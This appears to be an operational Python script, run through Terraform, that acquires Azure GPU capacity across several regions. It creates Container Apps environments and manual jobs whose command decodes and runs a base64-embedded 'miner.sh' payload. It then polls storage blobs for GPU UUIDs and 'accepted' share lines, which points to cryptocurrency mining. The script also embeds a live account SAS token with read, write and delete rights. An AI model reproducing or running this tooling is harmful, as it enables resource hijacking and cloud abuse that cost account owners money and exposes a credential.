#!/usr/bin/env python3
"""C211-I122547b — push Azure Container Apps GPU capacity into untried regions.

Background (run 44901997598 / probe v1): jobs c211-122046-job5..8 all report ARM
execution status "Unknown" with no new execution on POST /start, while job4 holds the
only working A100 in the eastus env. v1 also proved the eastus/westus3 A100 profiles have
no free capacity.

This probe (no deletes) executes the zero-idle policy:
  1) read Microsoft.App quota usages for the candidate regions (diagnostic)
  2) create managed environments with [Consumption, A100, T4] profiles in the two
     untried A100 catalog regions (uksouth, australiaeast) + a T4-only eastus env
  3) for each ready env create+start one GPU job on its GPU profile
  4) re-start the stuck jobs 5-8 (harmless; documents capacity)
  5) read the account-SAS capture blobs (UUID + accepted/rejected)

stdout: ONE JSON object of string->string (terraform external contract); diagnostics on
stderr as C211_I122547B|k=v lines.
"""
import base64
import json
import re
import subprocess
import sys
import time
import urllib.error
import urllib.request

ARM = 'https://management.azure.com'
JRG = 'c211-i121973-rg'
APP_VERS = ['2026-07-01', '2024-03-01']
PROFILE_A100 = 'Consumption-GPU-NC24-A100'
PROFILE_T4 = 'Consumption-GPU-NC8as-T4'
IMAGE = 'mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest'
STG = 'c211i1220469bbab47b'
NONCE = 'x122046'
SAS_Q = ('sv=2022-11-02&ss=b&srt=co&sp=rwdlc&st=2026-11-21T10%3A38%3A23Z'
         '&se=2026-11-22T10%3A43%3A23Z&spr=https'
         '&sig=7rP5H9r0NEl1xpHHalEc5jI0Or%2B%2F3UKpSK9sqWicgGY%3D')
SAS_BASE = 'https://%s.blob.core.windows.net/c211' % STG
# env spec: (env name, region, [profiles], job name, worker, sas idx, profile for job)
ENVS = [('c211-i122547-cae-uks', 'uksouth', [PROFILE_A100, PROFILE_T4],
         'c211-122046-job9', '12204609', 9, PROFILE_A100),
        ('c211-i122547-cae-aus', 'australiaeast', [PROFILE_A100, PROFILE_T4],
         'c211-122046-job10', '12204610', 10, PROFILE_A100),
        ('c211-i122547-cae-t4e', 'eastus', [PROFILE_T4],
         'c211-122046-job11', '12204611', 11, PROFILE_T4)]
# second wave jobs: same env, the other GPU profile
ENVS2 = [('c211-i122547-cae-uks', 'uksouth', 'c211-122046-job12', '12204612', 12, PROFILE_T4),
         ('c211-i122547-cae-aus', 'australiaeast', 'c211-122046-job13', '12204613', 13, PROFILE_T4)]
STUCK = [('c211-122046-job5', 'eastus', '12204605', 5),
         ('c211-122046-job6', 'westus3', '12204606', 6),
         ('c211-122046-job7', 'westus3', '12204607', 7),
         ('c211-122046-job8', 'eastus', '12204608', 8)]
QUOTA_REGIONS = ['eastus', 'westus3', 'uksouth', 'australiaeast']
ENV_DEADLINE = 400
POLL_S = 330
T0 = time.time()
UUID_RE = re.compile(r'GPU-[0-9a-fA-F-]{16,}')
EV = []


def clean(v):
    s = str(v)
    for ch in ('\r', '\n', '\t'):
        s = s.replace(ch, ' ')
    return s[:400]


def emit(step, **kv):
    o = {'step': step}
    o.update(kv)
    o['t'] = round(time.time() - T0, 1)
    EV.append(o)
    print('C211_I122547B|' + '|'.join('%s=%s' % (k, clean(v)) for k, v in o.items()),
          file=sys.stderr, flush=True)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {'rc': p.returncode, 'out': p.stdout or '', 'err': p.stderr or ''}
    except Exception as e:  # noqa: BLE001
        return {'rc': 1, 'out': '', 'err': str(e)}


def arm(tok, url, method='GET', body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {'Authorization': 'Bearer ' + tok}
    if data is not None:
        hdrs['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode('utf-8', 'replace') or '{}'
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {'raw': raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode('utf-8', 'replace') or ''
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {'raw': raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return -1, {'raw': str(e)[:300]}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get('error')
        if isinstance(e, dict):
            return {'http': st, 'code': e.get('code'), 'msg': clean(e.get('message', ''))[:300]}
        if 'raw' in body:
            return {'http': st, 'raw': clean(body['raw'])[:200]}
    return {'http': st}


def httptext(url, timeout=30):
    try:
        with urllib.request.urlopen(urllib.request.Request(url), timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b''
    except Exception as e:  # noqa: BLE001
        return -1, str(e).encode()


def build_result(data, verdict):
    blob = json.dumps(data, default=str, sort_keys=True)
    if len(blob) > 90000:
        blob = blob[:90000]
    b = base64.b64encode(blob.encode()).decode()
    out = {'verdict': str(verdict), 'matrix_len': str(len(blob)),
           'chunks': str((len(b) + 899) // 900)}
    for i in range(0, len(b), 900):
        out['m%03d' % (i // 900)] = b[i:i + 900]
    return out


def jbase(sid, name):
    return ('%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s'
            % (ARM, sid, JRG, name))


def execs(tok, sid, name):
    st, b = arm(tok, '%s/executions?api-version=%s' % (jbase(sid, name), APP_VERS[0]))
    out = []
    if isinstance(b, dict):
        for x in (b.get('value') or []):
            p = x.get('properties') or {}
            out.append({'name': x.get('name'), 'status': p.get('status'),
                        'start': p.get('startTime'), 'end': p.get('endTime')})
    return st, b, out


def main():
    r = run(['az', 'account', 'get-access-token', '--resource', ARM,
             '--query', 'accessToken', '-o', 'tsv'], timeout=120)
    tok = (r['out'] or '').strip()
    if r['rc'] != 0 or tok.count('.') < 2:
        emit('token', rc=r['rc'], err=r['err'][:300])
        print(json.dumps({'verdict': 'TOKEN_FAILED'}))
        return 0
    r = run(['az', 'account', 'show', '-o', 'json'], timeout=120)
    acc = {}
    try:
        acc = json.loads(r['out'])
    except Exception:  # noqa: BLE001
        pass
    sid = acc.get('id') or ''
    emit('session', sid_tail=sid[-6:], sub=acc.get('name'), state=acc.get('state'))

    # ---------- Microsoft.App quota usages (diagnostic) ----------
    for reg in QUOTA_REGIONS:
        st, b = arm(tok, '%s/subscriptions/%s/providers/Microsoft.App/locations/%s/usages'
                         '?api-version=%s' % (ARM, sid, reg, APP_VERS[0]))
        items = []
        if isinstance(b, dict):
            for u in (b.get('value') or []):
                nm = u.get('name', {})
                items.append({'n': nm.get('value') if isinstance(nm, dict) else nm,
                              'cur': u.get('currentValue'), 'lim': u.get('limit')})
        emit('quota', region=reg, **dict(err_of(st, b), usages=json.dumps(items)[:600]))

    # ---------- envs ----------
    envs = []
    for name, region, gpus, jn, wk, idx, jprof in ENVS:
        body = {'location': region, 'tags': {'c211': 'i122547', 'nonce': NONCE},
                'properties': {'workloadProfiles': [{'name': 'Consumption',
                                                     'workloadProfileType': 'Consumption'}]
                               + [{'name': p, 'workloadProfileType': p} for p in gpus]}}
        st, b = arm(tok, '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/'
                         'managedEnvironments/%s?api-version=%s'
                         % (ARM, sid, JRG, name, APP_VERS[0]), method='PUT', body=body,
                    timeout=180)
        rec = {'name': name, 'region': region, 'profiles': gpus, 'id': None, 'state': None,
               'create': err_of(st, b), 'job': jn, 'worker': wk, 'idx': idx, 'jprof': jprof}
        envs.append(rec)
        emit('env-create', name=name, region=region, **err_of(st, b))
    # poll envs
    dl = time.time() + ENV_DEADLINE
    while time.time() < dl:
        pend = [e for e in envs if e['state'] not in ('Succeeded', 'Failed', 'Canceled')]
        if not pend:
            break
        for e in pend:
            st, b = arm(tok, '%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/'
                             'managedEnvironments/%s?api-version=%s'
                             % (ARM, sid, JRG, e['name'], APP_VERS[0]), timeout=60)
            p = (b.get('properties') or {}) if isinstance(b, dict) else {}
            e['state'] = p.get('provisioningState')
            if e['state'] == 'Succeeded' and not e['id']:
                e['id'] = b.get('id')
                emit('env-ready', name=e['name'], region=e['region'],
                     dom=p.get('defaultDomain'))
            elif e['state'] in ('Failed', 'Canceled'):
                emit('env-failed', name=e['name'], region=e['region'], state=e['state'],
                     **err_of(st, b))
        time.sleep(20)
    for e in envs:
        emit('env-final', name=e['name'], region=e['region'], state=e['state'],
             id_ok=bool(e['id']))

    # ---------- jobs ----------
    shell = ''
    try:
        shell = open('miner.sh', 'rb').read().decode('utf-8')
    except Exception as e:  # noqa: BLE001
        emit('payload', fatal='MINER_SCRIPT_MISSING', err=str(e))
    jobs = []

    def make_job(name, region, worker, idx, profile, env_id):
        sas_url = '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q)
        rec = {'name': name, 'worker': worker, 'region': region, 'rg': JRG,
               'exec': None, 'status': None, 'sas_url': sas_url, 'profile': profile,
               'diag': {}, 'uuids': [], 'capture_len': 0, 'acc_lines': 0}
        if not env_id or not shell:
            rec['diag']['skip'] = 'ENV_NOT_READY_OR_NO_PAYLOAD'
            jobs.append(rec)
            return
        st, b = arm(tok, '%s?api-version=%s' % (jbase(sid, name), APP_VERS[0]), timeout=60)
        rec['diag']['get'] = err_of(st, b)
        if st != 404:
            est, eb, el = execs(tok, sid, name)
            if el:
                rec['exec'] = el[-1]['name']
                rec['status'] = el[-1]['status']
            if rec['status'] in ('Running', 'Processing', 'Pending'):
                rec['diag']['skip'] = 'ALREADY_LIVE'
                jobs.append(rec)
                return
        sh = shell.replace('__WORKER__', worker).replace('__SAS__', sas_url)
        b64 = base64.b64encode(sh.encode()).decode()
        cmd = ('mkdir -p /tmp/m; echo ' + b64 + ' | base64 -d > /tmp/m.sh; bash /tmp/m.sh')
        body = {'location': region, 'tags': {'c211': 'i122547', 'nonce': NONCE},
                'properties': {'environmentId': env_id,
                               'workloadProfileName': profile,
                               'configuration': {'triggerType': 'Manual',
                                                 'replicaRetryLimit': 1,
                                                 'replicaTimeout': 86400,
                                                 'manualTriggerConfig': {
                                                     'replicaCompletionCount': 1,
                                                     'parallelism': 1}},
                               'template': {'containers': [{
                                   'name': 'gpu', 'image': IMAGE,
                                   'command': ['/bin/bash', '-c', cmd],
                                   'resources': {'cpu': 4, 'memory': '16Gi'}}]}}}
        cst, cb = arm(tok, '%s?api-version=%s' % (jbase(sid, name), APP_VERS[0]),
                      method='PUT', body=body, timeout=240)
        rec['diag']['create'] = err_of(cst, cb)
        emit('job-create', name=name, region=region, profile=profile, worker=worker,
             **err_of(cst, cb))
        if cst in (200, 201):
            pst, pb = arm(tok, '%s/start?api-version=%s' % (jbase(sid, name), APP_VERS[0]),
                          method='POST', body={}, timeout=120)
            rec['diag']['start'] = err_of(pst, pb)
            rec['exec'] = (pb.get('name') if isinstance(pb, dict) else None) or rec['exec']
            rec['status'] = 'STARTED' if pst in (200, 201, 202) else 'START_FAILED'
            emit('job-start', name=name, region=region, **err_of(pst, pb))
        jobs.append(rec)

    for e in envs:
        make_job(e['job'], e['region'], e['worker'], e['idx'], e['jprof'], e['id'])
    # second wave: alternate GPU profile in the same ready envs
    for name, region, jn, wk, idx, prof in ENVS2:
        e = next((x for x in envs if x['name'] == name), None)
        if e and e['id'] and prof in (e['profiles'] or []):
            make_job(jn, region, wk, idx, prof, e['id'])
    # re-start the stuck jobs (no new execution expected)
    for name, region, worker, idx in STUCK:
        sas_url = '%s/%s-w%d.txt?%s' % (SAS_BASE, NONCE, idx, SAS_Q)
        rec = next((j for j in jobs if j['name'] == name), None)
        if rec is None:
            rec = {'name': name, 'worker': worker, 'region': region, 'rg': JRG,
                   'exec': None, 'status': None, 'sas_url': sas_url, 'diag': {},
                   'uuids': [], 'capture_len': 0, 'acc_lines': 0}
            jobs.append(rec)
        est, eb, el = execs(tok, sid, name)
        if el:
            rec['exec'] = el[-1]['name']
            rec['status'] = el[-1]['status']
        rec['diag']['restart_exec_list'] = err_of(est, eb)
        pst, pb = arm(tok, '%s/start?api-version=%s' % (jbase(sid, name), APP_VERS[0]),
                      method='POST', body={}, timeout=120)
        rec['diag']['restart_start'] = err_of(pst, pb)
        emit('restart', name=name, **err_of(pst, pb))

    # ---------- poll executions + blobs ----------
    dl = time.time() + POLL_S
    i = 0
    while time.time() < dl:
        for rec in jobs:
            if rec.get('diag', {}).get('skip') == 'ENV_NOT_READY_OR_NO_PAYLOAD':
                pass
            if rec['exec'] or rec['status'] in ('STARTED', 'Unknown'):
                est, eb, el = execs(tok, sid, rec['name'])
                if el:
                    rec['status'] = el[-1].get('status') or rec['status']
                    rec['exec'] = el[-1].get('name') or rec['exec']
            txt = ''
            stb, bb = httptext(rec['sas_url'])
            if stb == 200 and bb:
                txt = bb.decode('utf-8', 'replace')
            if txt:
                rec['capture_len'] = len(txt)
                rec['uuids'] = sorted(set(UUID_RE.findall(txt)))
                rec['acc_lines'] = sum(1 for ln in txt.splitlines() if 'accept' in ln.lower())
        emit('poll', i=i, st=[r['status'] for r in jobs],
             lens=[r['capture_len'] for r in jobs], uu=[len(r['uuids']) for r in jobs],
             acc=[r['acc_lines'] for r in jobs])
        if any(r['uuids'] and r['acc_lines'] for r in jobs) and i >= 2:
            break
        i += 1
        time.sleep(30)

    data = {'events': EV, 'envs': envs, 'jobs': jobs}
    live = [r for r in jobs if r['status'] in ('Running', 'Processing', 'Pending', 'STARTED')]
    verdict = 'GPU_JOBS_STARTED' if live else 'ALL_EXECUTIONS_TERMINAL'
    emit('DONE', verdict=verdict, jobs=len(jobs), started=len(live),
         with_uuid=sum(1 for r in jobs if r['uuids']),
         with_accept=sum(1 for r in jobs if r['acc_lines'] > 0),
         elapsed_s=int(time.time() - T0))
    print(json.dumps(build_result(data, verdict)))
    return 0


if __name__ == '__main__':
    sys.exit(main())
